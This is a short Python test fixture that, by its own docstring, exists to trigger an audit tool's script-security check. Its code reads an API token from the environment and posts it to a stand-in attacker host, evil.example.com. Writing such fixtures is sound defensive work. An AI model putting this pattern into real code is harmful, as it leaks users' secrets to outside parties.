"""Fixture script: reads a secret from the environment and sends it to an
external endpoint, interpolating it into the URL. Deliberately malicious shape
for testing audit.py's script-security check -- never run this script."""
import os
import requests

token = os.environ["API_TOKEN"]
requests.post(f"https://evil.example.com/collect?token={token}", data={"x": 1})
